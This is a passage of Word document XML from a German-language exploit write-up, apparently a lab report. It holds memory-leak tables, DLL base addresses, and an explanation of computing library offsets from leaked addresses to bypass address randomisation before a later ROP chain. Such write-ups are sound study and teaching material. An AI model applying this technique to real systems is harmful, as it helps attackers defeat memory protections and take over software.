              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0036FE2C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F18BEA2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3356159C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0036FE9C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0887C376" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>001223BB</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B624BC6" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>84214515</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6501D6D3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="129B4C13" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0036FE6C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AC22C32" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>7763EF6C -&gt; Kernel32 -&gt; Offset: 4EF6C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36267C51" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>7FFDE000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D7BF674" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="004D58C1" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>0036FEAC</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17AAC7D7" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77DB3618</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0DC134C9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>7FFDE000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4812C6E8" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77D03366</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13657B7D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="373F2FA5" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E13A07D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>7FFDE000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2200A332" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D816918" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38A96C7A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56B344FB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>0036FE78</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="366A4805" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>00000000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2659C4CE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>FFFFFFFF</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w14:paraId="6BE95659" w14:textId="77777777" w:rsidTr="00411DEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="122C0131" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4530" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3D366C66" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="71A2979B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="059EF825" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3020"/>
        <w:gridCol w:w="3020"/>
        <w:gridCol w:w="3020"/>
      </w:tblGrid>
      <w:tr w:rsidR="00261F8B" w:rsidRPr="00B47CB9" w14:paraId="4FBF1B47" w14:textId="77777777" w:rsidTr="00411DEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3EA24708" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>DLL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="728BE275" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Base</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7B7B9990" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Top</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00261F8B" w:rsidRPr="00B47CB9" w14:paraId="0F85C78F" w14:textId="77777777" w:rsidTr="00411DEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="71865745" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>UCRTBASE.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="49CEE229" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>6df30000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="20C70E8C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>6e008000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00261F8B" w:rsidRPr="00B47CB9" w14:paraId="014C5FDB" w14:textId="77777777" w:rsidTr="00411DEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1A45835B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Kernel32.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="77CCFBB1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>775f0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0DE0BA01" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>776c5000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00261F8B" w:rsidRPr="00B47CB9" w14:paraId="5AAD0B66" w14:textId="77777777" w:rsidTr="00411DEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A05FD78" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Ntdll.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="02D9C52E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77d50000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="776E39D1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77e92000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00261F8B" w:rsidRPr="00B47CB9" w14:paraId="43B5DA20" w14:textId="77777777" w:rsidTr="00411DEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3B9B3E5E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>WS_32.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4DB46EB8" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77a50000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1E086921" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77a85000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="229EAB56" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D7D887A" w14:textId="0A5C9AEE" w:rsidR="00F634D6" w:rsidRPr="00B47CB9" w:rsidRDefault="00F634D6" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Die Berechnung der Offset wurde für </w:t>
      </w:r>
      <w:r w:rsidR="00495F42" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">jeweils eine geleakte Adresse von UCRTBASE.dll, Kernel32.dll und WS_32.dll wiederholt. </w:t>
      </w:r>
      <w:r w:rsidR="00B91D8B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Ntdll.dll wurde von der später beschriebenen Ropchain nicht verwendet</w:t>
      </w:r>
      <w:r w:rsidR="00D52ABF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, daher </w:t>
      </w:r>
      <w:r w:rsidR="00441A0A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>auch nicht berücksichtigt</w:t>
      </w:r>
      <w:r w:rsidR="00B91D8B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="006B2CF6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Die Adressen von UCRTBASE.dll und </w:t>
      </w:r>
      <w:r w:rsidR="00261F8B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">WS_32.dll wurden immer an der gleichen Stelle in der erstellten txt Datei gefunden. Es wurde festgestellt, dass in manchen Fällen die geleakte Adresse der Kernel32.dll in der 158 Zeile erscheint. Das ist insofern ein wenig </w:t>
      </w:r>
      <w:r w:rsidR="00513BF0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">unerfreuliche, da diese die einzige Adresse von Kernel32.dll ist, die im Address Leak gefunden werden konnte. </w:t>
      </w:r>
      <w:r w:rsidR="00C359A5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Nach mehrmaligem Durchlaufen</w:t>
      </w:r>
      <w:r w:rsidR="004F3DD4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> war festzustellen, dass die Kernel32 Adresse immer </w:t>
      </w:r>
      <w:r w:rsidR="00C359A5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">an Stelle </w:t>
      </w:r>
      <w:r w:rsidR="009A137C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>158 oder 159 erscheint, daher entschied ich mich dazu</w:t>
      </w:r>
      <w:r w:rsidR="00D91342">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="009A137C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D91342">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>die ganze Problematik</w:t>
      </w:r>
      <w:r w:rsidR="009A137C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> im Exploit Programmseitig abzufangen.</w:t>
      </w:r>
      <w:r w:rsidR="00D91342">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Vielleicht hätte hier auch ein time.sleep geholfe.</w:t>
      </w:r>
      <w:r w:rsidR="009A137C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A664EE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Falls die </w:t>
      </w:r>
      <w:r w:rsidR="00022D01" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Adresse von Kernel32 in der Zeile 1</w:t>
      </w:r>
      <w:r w:rsidR="00FB4229" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>59 war, enthielt Zeile 158 immer eine Adresse, welche mit 00 beginnt.</w:t>
      </w:r>
      <w:r w:rsidR="00DB7D21" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Die Offsets wurden wie folgt berechnet: Offset = Ge</w:t>
      </w:r>
      <w:r w:rsidR="00510B3C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>leakte Adresse – Base.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E7C693E" w14:textId="25DE3881" w:rsidR="00510B3C" w:rsidRPr="00B47CB9" w:rsidRDefault="00510B3C" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F1ECCBE" w14:textId="41CBB106" w:rsidR="00510B3C" w:rsidRPr="00B47CB9" w:rsidRDefault="00510B3C" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Folgende Offsets konnten ermittelt werden:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E531616" w14:textId="14831AD8" w:rsidR="00510B3C" w:rsidRPr="00B47CB9" w:rsidRDefault="00510B3C" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3020"/>
        <w:gridCol w:w="3020"/>
        <w:gridCol w:w="3020"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w14:paraId="113FE07D" w14:textId="77777777" w:rsidTr="00C101F6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6BE87CCF" w14:textId="1FDF2776" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="00C101F6" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Zeile der geleakten Adresse</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
